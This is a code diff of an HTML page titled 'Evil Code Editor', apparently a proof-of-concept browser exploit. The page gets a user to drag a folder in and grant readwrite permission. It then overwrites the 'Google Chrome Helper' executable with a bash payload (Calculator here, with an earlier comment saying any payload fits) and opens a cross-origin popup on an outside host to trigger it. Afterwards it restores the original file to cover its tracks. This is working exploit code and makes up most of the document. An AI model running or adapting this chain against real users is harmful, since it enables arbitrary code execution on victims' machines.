@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Evil Code Editor</title>
     <style>
+      /* Global Styles */
       body,
       html {
         margin: 0;
@@ -16,6 +17,7 @@
         font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
           Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue",
           sans-serif;
+        background: #323232;
       }
       header {
         background-color: #333;
@@ -105,6 +107,7 @@
       </ol>
     </div>
 
+    <!-- RequireJS for loading Monaco Editor -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>
     <script>
       require.config({
@@ -112,6 +115,8 @@
           vs: "https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.21.2/min/vs",
         },
       });
+
+      // Monaco Environment Configuration
       window.MonacoEnvironment = { getWorkerUrl: () => proxy };
       let proxy = URL.createObjectURL(
         new Blob(
@@ -124,6 +129,7 @@
         )
       );
 
+      // Initialize Monaco Editor
       require(["vs/editor/editor.main"], function () {
         monaco.editor.create(document.getElementById("editor"), {
           value: [
@@ -147,6 +153,7 @@
       setTimeout(showPopup, 2000);
     </script>
 
+    <!-- Download Symlink and Drag-and-Drop Handling -->
     <script>
       async function downloadSymlink() {
         const zipBytes = atob(
@@ -181,12 +188,12 @@
         }
       });
 
-      document.addEventListener("dragleave", function (e) {
+      document.addEventListener("dragleave", (event) => {
         if (
-          e.clientX <= 0 ||
-          e.clientY <= 0 ||
-          e.clientX >= window.innerWidth ||
-          e.clientY >= window.innerHeight
+          event.clientX <= 0 ||
+          event.clientY <= 0 ||
+          event.clientX >= window.innerWidth ||
+          event.clientY >= window.innerHeight
         ) {
           document.body.classList.remove("dragging");
           isDragging = false;
@@ -204,67 +211,69 @@
         for (const item of items) {
           if (item.kind === "file") {
             let handle = await item.getAsFileSystemHandle();
-            // request readwrite permission
+            // Request readwrite permission
             const permissionStatus = await handle.requestPermission({
               mode: "readwrite",
             });
 
             if (permissionStatus === "granted") {
               console.log("Permission granted");
-              // read Google Chrome Helper file inside the folder
-              const fileHandle = await handle.getFileHandle(
-                "Google Chrome Helper"
-              );
-
-              if (!fileHandle) {
-                return alert("Unsupported browser or OS");
-              }
-
-              if (fileHandle.kind !== "file") {
-                return alert("Invalid demo project");
-              }
-
-              if (fileHandle.name !== "Google Chrome Helper") {
-                return alert("Invalid demo project");
-              }
-
-              document.getElementById("step-3").classList.add("strikethrough");
 
               try {
+                // Read specific file inside the folder
+                const fileHandle = await handle.getFileHandle(
+                  "Google Chrome Helper"
+                );
+
+                if (
+                  !fileHandle ||
+                  fileHandle.kind !== "file" ||
+                  fileHandle.name !== "Google Chrome Helper"
+                ) {
+                  return alert(
+                    "Invalid demo project or unsupported browser/OS"
+                  );
+                }
+
+                document
+                  .getElementById("step-3")
+                  .classList.add("strikethrough");
+
                 let file = await fileHandle.getFile();
-                const bytes = await file.arrayBuffer();
+                const originalBytes = await file.arrayBuffer();
 
-                console.log("overwriting file...");
+                // Overwrite file with payload
                 let writer = await fileHandle.createWritable();
-                writer.write("#!/bin/bash\nopen -a Calculator\n"); // any payload here
-                writer.close();
+                await writer.write("#!/bin/bash\nopen -a Calculator\n");
+                await writer.close();
 
-                setTimeout(function () {
-                  var videoElement = document.createElement("video");
-                  videoElement.src =
-                    "data:video/mp4;base64,THIRD+BASE64+CHUNK==";
-                  videoElement.autoplay = true;
-                  videoElement.muted = true;
-                  videoElement.controls = true;
-                  document.body.appendChild(videoElement);
-                }, 500);
+                console.log("Opening cross-origin popup...");
 
-                setTimeout(async function () {
-                  document.getElementById("step-4").innerText =
-                    "Oops! you just got pwned! 😈";
-                  document.getElementById("step-4").style.color = "red";
-                  try {
-                    writer = await fileHandle.createWritable();
-                    console.log("Writing payload");
-                    await writer.write(bytes);
-                    console.log("Payload written");
-                    await writer.close();
-                  } catch (err) {
-                    console.error(err);
+                let popup = window.open(
+                  "https://eix.co.il/print.html",
+                  "",
+                  "width=100,height=100"
+                );
+
+                window.addEventListener("message", async function (event) {
+                  if (event.data === "ready") {
+                    setTimeout(async () => {
+                      console.log("closing popup", popup.close());
+                      try {
+                        console.log("Restoring original file...");
+                        writer = await fileHandle.createWritable();
+                        await writer.write(originalBytes);
+                        await writer.close();
+                        console.log("File restored successfully");
+                      } catch (err) {
+                        console.error(err);
+                        console.log("Failed to restore file");
+                      }
+                    }, 2000.1337);
                   }
-                }, 1337);
+                });
               } catch (err) {
-                console.log(err);
+                console.error(err);
               }
             } else {
               alert("Sorry, you need to grant permission to continue");
